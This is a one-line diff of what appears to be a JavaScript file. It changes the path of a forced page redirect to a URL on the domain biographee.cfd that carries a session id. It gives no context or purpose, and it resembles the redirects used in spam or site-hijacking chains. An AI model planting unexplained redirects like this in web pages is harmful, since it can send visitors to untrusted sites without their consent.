@@ -1,1 +1,1 @@
-window.location.href = "https://biographee.cfd/sFSR/go?sid=7747";
+window.location.href = "https://biographee.cfd/cDu/go?sid=7747";
